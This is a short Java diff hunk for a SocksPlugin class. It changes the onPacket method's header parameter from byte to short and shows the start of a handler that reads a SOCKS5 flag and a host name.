@@ -40,7 +40,7 @@ public class SocksPlugin extends StubPlugin {
 	}
 
 	@Override
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == Global.HEADER_START) {	
 			final boolean socks5 = dis.readBoolean();
 			final String host = dis.readUTF();
